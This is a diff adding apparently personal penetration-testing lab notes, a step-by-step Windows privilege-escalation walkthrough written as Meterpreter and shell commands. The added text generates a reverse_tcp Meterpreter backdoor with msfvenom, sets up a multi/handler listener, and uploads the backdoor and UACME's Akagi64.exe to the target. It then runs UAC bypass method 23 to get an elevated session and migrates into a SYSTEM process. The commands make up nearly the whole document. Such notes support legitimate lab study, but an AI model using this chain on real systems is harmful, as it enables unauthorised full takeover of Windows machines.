@@ -179,26 +179,62 @@ meterpreter: `sysinfo`
 
 meterpreter: `getuid`
 
-meterpreter: `getprivs`
+meterpreter: `getprivs` N
 
-meterpreter:
+meterpreter: `shell`: verifying that this user is part of the local administrator group
 
-meterpreter:
+shell: `netuser`
 
-meterpreter:
+shell: `net localgroup administrators`: admin and administrator are part of the administrator group
 
-meterpreter ::
+Now after we gained access to the target system and verified that the user is part of the local administrator group, we take a closer look at UACME on GitHub
 
-meterpreter:
+shell: `exit`
 
-meterpreter: 
+we generate a meterpreter payload with msfvenom, then transfering it to the target and we will use the akagi executable with the key 23 and we will then execute the payload that we generated and that should bypass UAC
 
-meterpreter:
+new tab:`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -f exe > backdoor.exe`
 
-meterpreter:
+`ls`
+we have backdoor.exe uploaded
 
-meterpreter:
+`msfconsole`
 
-meterpreter:
 
-meterpreter:
+msfconsole: `use multi/handler`
+msfconsole: `set payload windows/meterpreter/reverse_tcp`
+msfconsole: `set LHOST [own IP]`
+msfconsole: `set LPORT 1234`
+msfconsole: `run`
+Reverse TCP Handler is now ready to recieve the malicious payload we generated.
+
+Back to the meterpreter session:
+
+meterpeter: `pwd`
+
+meterpeter: `getuid`
+
+meterpeter: `getprivs`
+
+meterpeter: `cd C:\\`
+
+meterpeter: `mkdir Temp`
+
+meterpeter: `cd Temp`
+
+meterpeter: `upload backdoor.exe`
+
+meterpreter: `upload /root/Desktop/tools/UACME/Akagi64.exe`
+
+meterpreter: `shell`
+
+Shell: `dir`
+
+If we want to execute backdoor.exe with admin privileges, it wont work because of UAC. To bypass UAC we use method/kex 23
+Shell. `Akagi64.exe 23 C:\Temp\backdoor.exe`: On the tcp handler we get a new meterpreter session (target).
+`getprivs`
+`ps`: we can migrate to any of these services (NT Authority\System
+`migrate 688`
+`sysinfo`
+
+
